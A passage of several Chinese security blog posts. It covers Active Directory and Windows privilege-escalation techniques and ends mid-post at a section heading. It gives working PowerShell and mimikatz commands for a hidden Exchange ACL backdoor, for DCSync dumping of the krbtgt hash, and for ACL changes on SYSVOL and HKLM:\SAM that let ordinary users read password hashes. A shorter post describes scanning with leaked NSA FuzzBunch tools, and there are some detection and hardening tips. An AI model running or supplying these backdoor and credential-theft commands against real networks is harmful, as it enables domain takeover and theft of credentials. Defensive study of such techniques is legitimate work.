$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<h4 id="5查看用户testb的sid">5.查看用户testb的sid</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser testb
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-1.png" alt="Alt text"></p>

<p>用户testb的objectsid为<code class="language-plaintext highlighter-rouge">S-1-5-21-1672228480-1396590849-334771951-2105</code></p>

<h4 id="6查看属于新添加用户testb的ace">6.查看属于新添加用户testb的ACE</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" | Where-Object {$_.SecurityIdentifier -eq "S-1-5-21-1672228480-1396590849-334771951-2105"}
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-2.png" alt="Alt text"></p>

<p>至此，后门安装成功</p>

<p>此时查看<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>组的用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Exchange Trusted Subsystem" /domain
</code></pre></div></div>

<p>无法发现后门用户testb</p>

<h3 id="后门启动方法">后门启动方法</h3>

<h4 id="1在另一台域内主机上登录用户testb">1.在另一台域内主机上登录用户testb</h4>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>runas /user:test\testb cmd
</code></pre></div></div>

<h4 id="2将用户testb添加到exchange-trusted-subsystem">2.将用户testb添加到Exchange Trusted Subsystem</h4>

<p>由于用户testb有对<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的完全访问权限，所以能够将自己添加到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>组中</p>

<p>Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb
</code></pre></div></div>

<h4 id="3重新登录用户testb">3.重新登录用户testb</h4>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>runas /user:test\testb cmd
</code></pre></div></div>

<h4 id="4使用mimikatz的dcsync功能导出用户krbtgt的hash">4.使用mimikatz的DCSync功能导出用户krbtgt的hash</h4>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
</code></pre></div></div>

<h4 id="5将用户testb从exchange-trusted-subsystem组中移除">5.将用户testb从Exchange Trusted Subsystem组中移除</h4>

<p>Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
Remove-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb -confirm:$false
</code></pre></div></div>

<p>由于用户testb具有对<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的完全访问权限，所以能够反复将自己添加或是移除<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code></p>

<h2 id="0x04-检测和防御建议">0x04 检测和防御建议</h2>
<hr>

<p>从根源上修复：去除<code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code>的WriteDACL权限</p>

<p>可供参考的脚本：</p>

<p>https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1</p>

<p>日志检测：</p>

<p>需要开启Active Directory的高级安全审核策略，当域对象的ACL被修改后，将产生ID为5136的日志</p>

<p>参考资料：</p>

<p>https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文记录了使用Exchange中特定ACL进行提权的过程，分析了利用条件，结合这个机制介绍了一个提权后门的利用方法，最后给出检测和防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 22, 2019
  </div>

  
</article><article class="post">
  <h1>内网安全——利用NSA Smbtouch批量检测内网</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近，NSA渗透工具被曝光，其中包含多个Windows远程漏洞利用工具，影响很大</p>

<p>本文不会具体介绍这些远程漏洞工具的使用方法，而是站在防御者的角度，介绍如何利用这些工具，更好的去保护自己的内网</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>FuzzBunch使用流程</li>
  <li>Smbtouch功能介绍</li>
  <li>编写python脚本实现批量检测内网是否存在可被SMB和NBT协议攻击的漏洞</li>
  <li>根据日志掌握内网主机信息</li>
</ul>

<p>检测的SMB和NBT远程提权漏漏洞列表如下：</p>

<ul>
  <li>ETERNALBLUE</li>
  <li>ETERNALCHAMPION</li>
  <li>ETERNALROMANCE</li>
  <li>ETERNALSYNERGY</li>
</ul>

<p><strong>注：</strong></p>

<p>个人认为，以上四个漏洞危害最大，尤其适用于内网工作组环境</p>

<h2 id="0x02-fuzzbunch">0x02 FuzzBunch</h2>
<hr>

<p>FuzzBunch框架，类似于metasploit，包含探测、攻击、利用等各种功能(仅根据目前泄露的资料)</p>

<p><strong>下载地址：</strong></p>

<p>https://github.com/fuzzbunch/fuzzbunch</p>

<p><strong>注：</strong></p>

<p>fuzzbunch提取自https://github.com/x0rz/EQGRP_Lost_in_Translation</p>

<h3 id="1-配置环境">1. 配置环境</h3>

<p>安装python2.6，参考下载地址：</p>

<p>http://dl.nexiao.com/file.html?url=http%3A//b9.gpxz.net/201402/python-2_gpxz.6_gpxz.6_gpxz.rar</p>

<p>安装pywin32，参考下载地址：</p>

<p>https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download</p>

<h3 id="2-添加环境变量-cpython26">2. 添加环境变量 c:\python26</h3>

<h3 id="3-执行fbpy进入命令行操作模式">3. 执行fb.py进入命令行操作模式</h3>

<p>报错</p>

<p><strong>原因：</strong></p>

<p>泄露的资料里缺少listeningposts文件夹</p>

<p><strong>解决办法：</strong></p>

<p>在shadowbroker-master\windows\下创建个listeningposts文件夹</p>

<p>或者修改fb.py，修改好的文件可在如下链接下载：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/fb.py</p>

<p>再次执行fb.py，成功</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>执行start_lp.py可进入界面操作模式，如下图，此处不再过多介绍</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/2-2.png" alt="Alt text"></p>

<h3 id="4-设置启动参数如下">4. 设置启动参数如下：</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] Default Target IP Address [] : 
[?] Default Callback IP Address [] : 
[?] Use Redirection [yes] : 
[?] Base Log directory [D:\logs] :
</code></pre></div></div>

<p>进入fb的shell后输入use，可获得支持的插件目录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Plugin Category: Touch
======================

  Name                     Versi
  ----                     -----
  Architouch               1.0.0
  Domaintouch              1.1.1
  Eclipsedwingtouch        1.0.4
  Educatedscholartouch     1.0.0
  Emeraldthreadtouch       1.0.0
  Erraticgophertouch       1.0.1
  Esteemaudittouch         2.1.0
  Explodingcantouch        1.2.1
  Iistouch                 1.2.2
  Namedpipetouch           2.0.0
  Printjobdelete           1.0.0
  Printjoblist             1.0.0
  Rpctouch                 2.1.0
  Smbtouch                 1.1.1
  Webadmintouch            1.0.1
  Worldclienttouch         1.0.1


Plugin Category: ImplantConfig
==============================

  Name           Version
  ----           -------
  Darkpulsar     1.1.0
  Mofconfig      1.0.0


Plugin Category: Exploit
========================

  Name                   Version
  ----                   -------
  Easybee                1.0.1
  Easypi                 3.1.0
  Eclipsedwing           1.5.2
  Educatedscholar        1.0.0
  Emeraldthread          3.0.0
  Emphasismine           3.4.0
  Englishmansdentist     1.2.0
  Erraticgopher          1.0.1
  Eskimoroll             1.1.1
  Esteemaudit            2.1.0
  Eternalromance         1.4.0
  Eternalsynergy         1.0.1
  Ewokfrenzy             2.0.0
  Explodingcan           2.0.2
  Zippybeer              1.0.2


Plugin Category: Payload
========================

  Name              Version
  ----              -------
  Doublepulsar      1.3.1
  Jobadd            1.1.1
  Jobdelete         1.1.1
  Joblist           1.1.1
  Pcdlllauncher     2.3.1
  Processlist       1.1.1
  Regdelete         1.1.1
  Regenum           1.1.1
  Regread           1.1.1
  Regwrite          1.1.1
  Rpcproxy          1.0.1
  Smbdelete         1.1.1
  Smblist           1.1.1
  Smbread           1.1.1
  Smbwrite          1.1.1


Plugin Category: Special
========================

  Name                Version
  ----                -------
  Eternalblue         2.2.0
  Eternalchampion     2.0.0
</code></pre></div></div>

<p>插件共分为五大类，分别为：</p>

<ul>
  <li>Touch         信息探测、漏洞测试</li>
  <li>ImplantConfig 植入工具</li>
  <li>Exploit       漏洞利用</li>
  <li>Payload       Payload</li>
  <li>Special       专用</li>
</ul>

<p>每一个插件在文件夹下对应三个文件：</p>

<ul>
  <li>.exe</li>
  <li>.fb</li>
  <li>.xml</li>
</ul>

<p>例如Special下的Eternalblue-2.2.0，对应shadowbroker-master\windows\specials下的</p>

<ul>
  <li>Eternalblue-2.2.0.exe</li>
  <li>Eternalblue-2.2.0.fb</li>
  <li>Eternalblue-2.2.0.0.xml</li>
</ul>

<p>查看文件内容可发现：</p>

<ul>
  <li>exe能够单独执行(前提是找到需要的dll文件)</li>
  <li>exe读取xml文件中保存的配置参数（需要二次修改）</li>
</ul>

<p>也就是说，只需要单独的exe和xml配置文件，加上需要的支持文件，就能够执行对应的插件，不需要完全安装FuzzBunch框架</p>

<h2 id="0x03-smbtouch">0x03 Smbtouch</h2>
<hr>

<p>位于Touch类下，文件位于/windows/touches/，用于探测目标主机是否包含SMB和NBT远程提权漏漏洞，主要测试以下四个漏洞：</p>

<ul>
  <li>ETERNALBLUE</li>
  <li>ETERNALCHAMPION</li>
  <li>ETERNALROMANCE</li>
  <li>ETERNALSYNERGY</li>
</ul>

<h3 id="1命令行下测试">1.命令行下测试</h3>

<p>执行fb.py,进入命令行操作模式</p>

<p>设置好扫描参数，依次执行：</p>

<p><code class="language-plaintext highlighter-rouge">use Smbtouch</code></p>

<p><code class="language-plaintext highlighter-rouge">execute</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/3-1.png" alt="Alt text"></p>

<p>接着执行插件，回显如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/3-2.png" alt="Alt text"></p>

<p>探测成功，获得如下信息：</p>

<p>系统：Windows Server 2003 3790 Service Pack 2 x86</p>

<p>可用漏洞：</p>

<ul>
  <li>ETERNALROMANCE  - FB</li>
  <li>ETERNALCHAMPION - DANE/FB</li>
</ul>

<p>接着使用具体的漏洞攻击即可</p>

<p><strong>注:</strong></p>

<p>被攻击主机需要开放445端口，测试环境可选择关闭防火墙或是手动打开445端口</p>

<p>命令行开启445端口的代码如下:</p>

<p><code class="language-plaintext highlighter-rouge">netsh advfirewall firewall add rule name="445" protocol=TCP dir=in localport=445 action=allow</code></p>

<h3 id="2直接执行exe">2.直接执行exe</h3>

<p>进入文件夹shadowbroker-master\windows\touches，直接执行Smbtouch-1.1.1.exe</p>

<p>提示缺少dll，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/3-3.png" alt="Alt text"></p>

<p>在文件夹shadowbroker-master\windows\lib\x86-Windows下找到缺失的dll，补全</p>

<p>直接执行Smbtouch-1.1.1.exe，回显提示：</p>

<p><code class="language-plaintext highlighter-rouge">TargetIp must have a value assigned.</code></p>

<p>所以接下来需要编辑Smbtouch-1.1.1.0.xml文件</p>

<p>需要添加如下参数：</p>

<ul>
  <li>NetworkTimeout：60</li>
  <li>TargetIp：127.0.0.1</li>
  <li>TargetPort：445</li>
  <li>Protocol：SMB</li>
  <li>Credentials：Anonymous</li>
</ul>

<p>对照xml文件格式，添加代码<code class="language-plaintext highlighter-rouge">&lt;value&gt;data&lt;/value&gt;</code>，并且重命名为Smbtouch-1.1.1.xml</p>

<p><strong>注：</strong></p>

<p>文件名不是原来的Smbtouch-1.1.1.0.xml</p>

<p>修改好的xml文件可参照：</p>

<p>https://github.com/3gstudent/Smbtouch-Scanner/blob/master/Smbtouch-1.1.1.xml</p>

<p>再次执行Smbtouch-1.1.1.exe</p>

<p>回显如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/3-4.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/3-5.png" alt="Alt text"></p>

<p>成功执行，并且回显xml文件内容</p>

<h2 id="0x04-smbtouch-scanner">0x04 Smbtouch Scanner</h2>
<hr>

<p>基于以上内容，如果想尝试对指定网段进行扫描，那么需要反复修改xml配置文件，接着执行Smbtouch-1.1.1.exe进行探测</p>

<p>采用python自动实现以上操作，需要考虑如下问题：</p>

<ul>
  <li>执行Smbtouch-1.1.1.exe并获得回显</li>
  <li>对回显内容进行解析，去掉多余部分</li>
  <li>对范围ip地址解析</li>
  <li>自动读写xml文件</li>
  <li>生成log文件</li>
  <li>多线程提高效率</li>
</ul>

<p>完整代码可参考：</p>

<p>https://github.com/3gstudent/Smbtouch-Scanner</p>

<h3 id="实际测试">实际测试：</h3>

<h3 id="1设置扫描ip段">1.设置扫描ip段</h3>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/4-1.png" alt="Alt text"></p>

<h3 id="2执行smbtouchscannerpy">2.执行SmbtouchScanner.py</h3>

<p>等待扫描完成，回显显示简要信息</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/4-2.png" alt="Alt text"></p>

<h3 id="3同级目录生成日志文件显示详细信息">3.同级目录生成日志文件，显示详细信息</h3>

<p>包含具体存在的漏洞，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-20/4-3.png" alt="Alt text"></p>

<h3 id="4补充">4.补充</h3>

<p>考虑到安全原因，此开源代码尚不支持多线程</p>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>针对NSA的SMB和NBT远程提权漏漏洞，建议升级系统补丁，开启防火墙，限制445端口</p>

<p>限制445端口的命令行代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">netsh advfirewall firewall add rule name="445" protocol=TCP dir=in localport=445 action=block</code></p>

<p>同时，为确保内网安全，可使用SmbtouchScanner.py对内网进行扫描检测</p>

<p><strong>注：</strong></p>

<p>目前Smbtouch-1.1.1.exe已被杀毒软件查杀</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了如何使用python实现自动检测内网是否存在可被SMB和NBT协议攻击的漏洞，当然，泄露的漏洞不止以上4个，Touch插件也不只有Smbtouch</p>

<p>后续更新会同步至github：https://github.com/3gstudent/</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on April 20, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows下的Access Control List</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows系统中的ACL(Access Control List)，用来表示用户（组）权限的列表。</p>

<p>在渗透测试中，理解并运用ACL，尤其在后门利用(提权)方面，可供发挥的空间很大。</p>

<p>而站在防御的角度，如果系统被攻破，找到并清除攻击者留下的ACL后门，同样需要对ACL有一定的了解。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>ACL相关概念</li>
  <li>查看ACL</li>
  <li>ACL利用(文件、注册表和域环境)</li>
  <li>ACL检测</li>
</ul>

<h2 id="0x02-acl相关概念">0x02 ACL相关概念</h2>
<hr>

<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/access-control-lists</p>

<h4 id="acl">ACL：</h4>

<p>Access Control List，用来表示用户（组）权限的列表，包括DACL和SACL</p>

<h4 id="ace">ACE：</h4>

<p>Access Control Entry，ACL中的元素</p>

<h4 id="dacl">DACL：</h4>

<p>Discretionary Access Control List，用来表示安全对象权限的列表</p>

<h4 id="sacl">SACL：</h4>

<p>System Access Control List，用来记录对安全对象访问的日志</p>

<h4 id="直观理解">直观理解：</h4>

<p>Windows访问控制模型中会用到ACL，比如文件、注册表的权限都包括ACL，用来表示哪些用户（组）具有操作权限</p>

<p>例如对某个文件进行访问，系统将做以下判断：</p>

<ul>
  <li>如果没有DACL，系统将允许访问</li>
  <li>如果存在DACL，但没有ACE，系统将拒绝所有访问</li>
  <li>如果存在DACL，也存在ACE，那么会按照每个ACE指定允许或拒绝</li>
</ul>

<h3 id="实例演示">实例演示</h3>

<p>对于文件夹<code class="language-plaintext highlighter-rouge">C:\Windows\SYSVOL\sysvol\test.com</code>,查看文件夹属性</p>

<p>默认共有五条DACL，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-1.png" alt="Alt text"></p>

<p>选中一条DACL，其中包含多个ACE，表示具有的权限，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-2.png" alt="Alt text"></p>

<h2 id="0x03-文件中的acl">0x03 文件中的ACL</h2>
<hr>

<h3 id="常用命令icacls">常用命令(icacls)：</h3>

<h4 id="1查看指定文件的acl">1、查看指定文件的ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/3-1.png" alt="Alt text"></p>

<h4 id="2备份指定文件包括当前目录及其子目录中的文件的acl">2、备份指定文件(包括当前目录及其子目录中的文件)的ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /save AclFile /t
</code></pre></div></div>

<h4 id="3还原指定文件包括当前目录及其子目录中的文件的acl">3、还原指定文件(包括当前目录及其子目录中的文件)的ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\ /restore AclFile /t
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>还原时，路径需要设置为上级目录</p>

<h4 id="4添加用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限">4、添加用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /grant test1:(OI)(CI)(F) /t
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>(OI)代表对象继承
(CI)代表容器继承
(F)代表完全访问</p>

<h4 id="5移除用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限">5、移除用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /remove test1 /t
</code></pre></div></div>

<h3 id="常用命令powershell">常用命令(powershell)：</h3>

<h4 id="1查看指定路径的acl">1、查看指定路径的ACL</h4>

<p>例如<code class="language-plaintext highlighter-rouge">C:\Windows\SYSVOL\sysvol\test.com</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path 'C:\Windows\SYSVOL\sysvol\test.com'| Format-Table -wrap
</code></pre></div></div>

<h4 id="2添加用户test1对指定文件的完全访问权限">2、添加用户test1对指定文件的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Add-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.AddAccessRule($rule)
    Set-Acl $Path $acl
}
Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
</code></pre></div></div>

<h4 id="3移除用户test1对指定文件的完全访问权限">3、移除用户test1对指定文件的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Remove-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.RemoveAccessRule($rule)
    Set-Acl $Path $acl
}
Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
</code></pre></div></div>

<h4 id="4添加用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限-1">4、添加用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Add-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.AddAccessRule($rule)
    Set-Acl $Path $acl
}
Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
Foreach($file in $fileList)
{
    $file.fullname
    Add-ACL -Path $file.fullname
}
</code></pre></div></div>

<h4 id="5移除用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限-1">5、移除用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Remove-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.RemoveAccessRule($rule)
    Set-Acl $Path $acl
}
Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
Foreach($file in $fileList)
{
    Remove-ACL -Path $file.fullname
}
</code></pre></div></div>

<h3 id="利用思路">利用思路：</h3>

<h4 id="1本地提权后门">1、本地提权后门</h4>

<p>在取得Windows系统的管理员权限后，可以修改系统目录的ACL，添加普通用户的完全访问权限，作为提权后门</p>

<p>后续可以通过dll劫持、文件替换等多种方法从普通用户提升至管理员权限</p>

<h4 id="2域环境gpo的修改">2、域环境GPO的修改</h4>

<p>修改域内共享文件夹<code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code>的ACL，添加普通用户的完全访问权限</p>

<p>后续可以使用域内普通用户的权限修改域环境的GPO，修改GPO的计划任务，实现计划任务的远程执行</p>

<p>相关方法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">《域渗透——利用GPO中的计划任务实现远程执行》</a></p>

<h4 id="3域内普通用户读取域内所有用户hash">3、域内普通用户读取域内所有用户hash</h4>

<p>创建ntds.dit的文件共享，添加ACL</p>

<p>后续可以使用域内普通用户访问域控制器的ntds.dit文件，读取域内所有用户的hash</p>

<h2 id="0x04-注册表中的acl">0x04 注册表中的ACL</h2>
<hr>

<h3 id="常用命令powershell-1">常用命令(powershell)：</h3>

<h4 id="1查看指定路径的acl-1">1、查看指定路径的ACL</h4>

<p>例如<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path 'HKLM:\SAM'| Format-Table -wrap
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-1.png" alt="Alt text"></p>

<p>获得Access项的具体内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl -Path 'HKLM:\SAM'
$acl.Access
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-2.png" alt="Alt text"></p>

<h4 id="2添加用户test1对指定路径包括当前注册表项及其子健的完全访问权限">2、添加用户test1对指定路径(包括当前注册表项及其子健)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:\SAM
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
Set-Acl HKLM:\SAM $acl
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"</code>表示其子健继承当前注册表项的权限</p>

<p>修改注册表项<code class="language-plaintext highlighter-rouge">HKLM:\SAM</code>的ACL需要Administrator权限</p>

<p>修改注册表项<code class="language-plaintext highlighter-rouge">HKLM:\SAM\SAM</code>的ACL需要System权限</p>

<h4 id="3移除用户test1对指定路径包括当前注册表项及其子健的完全访问权限">3、移除用户test1对指定路径(包括当前注册表项及其子健)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:\SAM
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.RemoveAccessRule($rule)
Set-Acl HKLM:\SAM $acl
</code></pre></div></div>

<h3 id="利用思路-1">利用思路：</h3>

<h4 id="1本地提权后门-1">1、本地提权后门</h4>

<p>修改注册表项<code class="language-plaintext highlighter-rouge">HKLM:\SAM</code>和<code class="language-plaintext highlighter-rouge">HKLM:\SYSTEM</code>，添加普通用户的完全访问权限</p>

<p>普通用户能够通过注册表项获得本地所有用户的hash，进而获得管理员权限</p>

<h4 id="3本地自启动后门">3、本地自启动后门</h4>

<p>修改注册表位置，添加启动项或者劫持项</p>

<h2 id="0x05-域环境中的acl">0x05 域环境中的ACL</h2>
<hr>

